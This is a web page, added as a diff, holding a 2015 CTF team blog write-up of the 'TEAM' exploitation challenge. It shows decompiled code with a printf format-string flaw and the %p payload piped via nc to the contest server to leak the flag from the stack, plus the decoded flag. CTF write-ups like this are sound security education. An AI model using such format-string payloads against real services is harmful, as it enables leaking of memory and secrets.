@@ -1,0 +1,388 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Backdoor CTF 2015 - TEAM Writeup - GeeksSpeak Team Blog</title>
+  <meta name="author" content="GeeksSpeak">
+
+  
+  <meta name="description" content="Backdoor 2015 TEAM Writeup
+Point = 600
+Category = Exploit There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="GeeksSpeak Team Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">GeeksSpeak Team Blog</a></h1>
+  
+    <h2>WriteUps and random thoughts</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="geeksspeak.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Backdoor CTF 2015 - TEAM Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-04-03T03:16:39+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>3:16 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
+<strong>Point = 600</strong><br/>
+<strong>Category = Exploit</strong></p>
+
+<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file team
+</span><span class='line'>team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
+</span><span class='line'>$ checksec.sh --file team
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first on can be seen bellow:</p>
+
+<!--more-->
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_8048769()
+</span><span class='line'>{
+</span><span class='line'>  const char *v0; // ST18_4@1
+</span><span class='line'>  const char *v1; // ST1C_4@1
+</span><span class='line'>
+</span><span class='line'>  v0 = (const char *)malloc(0xC8u);
+</span><span class='line'>  v1 = (const char *)malloc(0x64u);
+</span><span class='line'>  printf("Enter teamname: ");
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  __isoc99_scanf("%200s", v0);
+</span><span class='line'>  printf("Enter flag: ");
+</span><span class='line'>  fflush(stdout);
+</span><span class='line'>  __isoc99_scanf("%100s", v1);
+</span><span class='line'>  sleep(2u);
+</span><span class='line'>  sub_80486AD(v0, v1);
+</span><span class='line'>  free((void *)v0);
+</span><span class='line'>  free((void *)v1);
+</span><span class='line'>  return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see there is no potential flaw so we skip to second one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
+</span><span class='line'>{
+</span><span class='line'>  signed int result; // eax@2
+</span><span class='line'>  int v3; // edx@7
+</span><span class='line'>  FILE *stream; // [sp+24h] [bp-74h]@1
+</span><span class='line'>  char s; // [sp+28h] [bp-70h]@3
+</span><span class='line'>  int v6; // [sp+8Ch] [bp-Ch]@1
+</span><span class='line'>
+</span><span class='line'>  v6 = *MK_FP(__GS__, 20);
+</span><span class='line'>  stream = fopen("flag.txt", "r");
+</span><span class='line'>  if ( stream )
+</span><span class='line'>  {
+</span><span class='line'>    fgets(&s, 100, stream);
+</span><span class='line'>    printf(a1);
+</span><span class='line'>    if ( !strcmp(&s, a2) )
+</span><span class='line'>      puts(" : correct flag!");
+</span><span class='line'>    else
+</span><span class='line'>      puts(" : incorrect flag. Try again.");
+</span><span class='line'>    fclose(stream);
+</span><span class='line'>    result = 0;
+</span><span class='line'>  }
+</span><span class='line'>  else
+</span><span class='line'>  {
+</span><span class='line'>    result = 1;
+</span><span class='line'>  }
+</span><span class='line'>  v3 = *MK_FP(__GS__, 20) ^ v6;
+</span><span class='line'>  return result;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 5
+</span><span class='line'>%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+</span><span class='line'>A
+</span><span class='line'>
+</span><span class='line'>$ cat 5 | nc hack.bckdr.in 8004
+</span><span class='line'>Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>you can see that</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137</span></code></pre></td></tr></table></div></figure>
+
+
+<p>is our flag. using python <code>struct</code> module for all gives us this one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>d3f5106d91e77a42be5805acd58a1b8dad11af78fcc5f381c2df5636953571fb</span></code></pre></td></tr></table></div></figure>
+
+
+<p>which added 600pts to our points.</p>
+
+<p>HAMIDx9</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">GeeksSpeak</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-04-03T03:16:39+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>3:16 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/backdoor/'>backdoor</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/fmt/'>fmt</a>, <a class='category' href='/blog/categories/leak/'>leak</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/" data-via="" data-counturl="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/" title="Previous Post: Backdoor CTF 2015 - FORGOT Writeup">&laquo; Backdoor CTF 2015 - FORGOT Writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/04/03/backdoor-ctf-2015-team-writeup/">Backdoor CTF 2015 - TEAM Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/">Backdoor CTF 2015 - FORGOT Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/">Backdoor CTF 2015 - CONCEALED Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/">Backdoor CTF 2015 - ECHO Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/">Backdoor CTF 2015 - Medusa Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/GeeksSpeak">@GeeksSpeak</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'GeeksSpeak',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - GeeksSpeak -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
